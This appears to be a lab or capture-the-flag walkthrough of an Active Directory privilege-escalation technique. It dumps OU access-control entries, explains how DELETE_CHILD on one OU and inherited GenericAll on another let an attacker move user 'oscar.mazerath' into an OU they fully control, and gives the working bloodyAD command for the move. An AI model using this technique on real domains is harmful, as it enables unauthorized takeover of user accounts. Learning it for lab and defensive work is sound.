# Change an Object’s OU using DELETE CHILD ace

IT-Tier1: `caleb.turner` has a `DELETE_CHILD` permission, but the `IT OU operators` group has no ACEs here. This means we can remove objects from this OU but cannot write to them through group membership alone.

```
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==nTSecurityDescriptor.ACL.3.Trustee: caleb.turnernTSecurityDescriptor.ACL.3.Right: DELETE_CHILDnTSecurityDescriptor.ACL.3.ObjectType: Self
```

IT-Tier2: The `IT OU operators` group has `GenericAll` with `CONTAINER_INHERIT`, but two Deny ACEs override it. `CREATE_CHILD` for User objects and `WRITE_PROP` are both denied. Since Deny always wins over Allow, this OU is locked down for us.

```
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==nTSecurityDescriptor.ACL.0.Trustee: IT OU OperatorsnTSecurityDescriptor.ACL.0.Right: CREATE_CHILDnTSecurityDescriptor.ACL.0.ObjectType: UsernTSecurityDescriptor.ACL.1.Type: == DENIED ==nTSecurityDescriptor.ACL.1.Trustee: IT OU OperatorsnTSecurityDescriptor.ACL.1.Right: WRITE_PROPnTSecurityDescriptor.ACL.1.ObjectType: SelfnTSecurityDescriptor.ACL.6.Type: == ALLOWED ==nTSecurityDescriptor.ACL.6.Trustee: IT OU OperatorsnTSecurityDescriptor.ACL.6.Right: GENERIC_ALLnTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT
```

IT-Tier3: The IT OU operators has also a  `GenericAll` with `CONTAINER_INHERIT` and no Deny ACEs. This is the target, full, unrestricted control over this OU and any objects within it.

```
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==nTSecurityDescriptor.ACL.4.Trustee: IT OU OperatorsnTSecurityDescriptor.ACL.4.Right: GENERIC_ALLnTSecurityDescriptor.ACL.4.ObjectType: SelfnTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
```

IT-Tier4: IT OU operators has `GenericAll` with `CONTAINER_INHERIT`, but `CREATE_CHILD` for User objects is denied. Similar to Tier2 but slightly less restrictive.

```
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==nTSecurityDescriptor.ACL.0.Trustee: IT OU OperatorsnTSecurityDescriptor.ACL.0.Right: CREATE_CHILDnTSecurityDescriptor.ACL.0.ObjectType: UsernTSecurityDescriptor.ACL.5.Type: == ALLOWED ==nTSecurityDescriptor.ACL.5.Trustee: IT OU OperatorsnTSecurityDescriptor.ACL.5.Right: GENERIC_ALLnTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT
```

Moving an AD object between OUs requires `DELETE_CHILD` on the source OU and `CREATE_CHILD` on the destination OU. We have both: `DELETE_CHILD` on `IT-Tier1` through `caleb.turner`'s direct ACE, and `CREATE_CHILD` on IT-Tier3 through IT OU Operators' `GenericAll` (which includes `CREATE_CHILD`) with no Deny ACEs blocking it. Once `oscar.mazerath` lands in IT-Tier3, the `CONTAINER_INHERIT` flag on the `GenericAll` ACE kicks in, granting us full control over the user object.

**DELETE_CHILD on Tier1 (source) — as caleb.turner directly**

```
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==nTSecurityDescriptor.ACL.3.Trustee: caleb.turnernTSecurityDescriptor.ACL.3.Right: DELETE_CHILDnTSecurityDescriptor.ACL.3.ObjectType: Self
```

**CREATE_CHILD on Tier3 (destination) — via IT OU Operators membership**

```
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==nTSecurityDescriptor.ACL.4.Trustee: IT OU OperatorsnTSecurityDescriptor.ACL.4.Right: GENERIC_ALLnTSecurityDescriptor.ACL.4.ObjectType: SelfnTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
```

We move `oscar.mazerath` from `IT-Tier1` to `IT-Tier3`.

```
bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k set object 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' distinguishedName -v 'CN=oscar.mazerath,OU=IT-Tier3,DC=hsm-defense,DC=local'
```